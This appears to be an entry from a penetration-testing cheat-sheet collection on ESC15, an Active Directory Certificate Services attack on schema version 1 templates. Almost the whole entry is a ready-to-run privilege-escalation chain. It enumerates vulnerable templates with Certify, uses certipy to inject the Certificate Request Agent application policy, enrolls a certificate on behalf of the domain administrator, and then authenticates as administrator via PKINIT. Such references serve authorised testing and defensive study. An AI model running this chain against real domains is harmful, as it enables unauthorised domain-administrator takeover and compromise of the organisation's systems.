---
technique: ESC15 - Schema V1 Application Policy
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc15 certificate-services pkinit
---

# ESC15 - Schema V1 Application Policy

ESC15 abuses schema version 1 templates that accept attacker-supplied Application Policies.

## Windows

### ESC15: Certify (enumerate)

#powershell #certify #application-policy #schema-v1

ESC15 targets schema version 1 templates; no Windows tool supports arbitrary application policy injection at the time of writing, use Linux.

```powershell title:"ESC15: enumerate schema v1 templates (exploitation requires Linux)"
.\Certify.exe find /vulnerable
```
<!-- cheat
import domain_ip
import users
-->

## Linux

### ESC15: Step 1: inject Certificate Request Agent policy (certipy)

#certipy #application-policy #schema-v1 #cve-2024-49019

Inject the Certificate Request Agent application policy OID into a schema v1 template request to get an enrollment agent cert.

```sh title:"ESC15: request with injected enrollment agent app policy"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name -application-policies "1.3.6.1.4.1.311.20.2.1"
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC15: Step 2: enroll on behalf of administrator (certipy)

#certipy #application-policy #schema-v1

Use the enrollment agent cert issued via ESC15 to enroll on behalf of administrator.

```sh title:"ESC15: enroll on-behalf-of administrator using ESC15 agent cert"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User -on-behalf-of "$domain\\administrator" -pfx $user.pfx
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC15: Step 3: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the issued administrator cert.

```sh title:"ESC15: PKINIT with administrator cert from ESC15 chain"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->
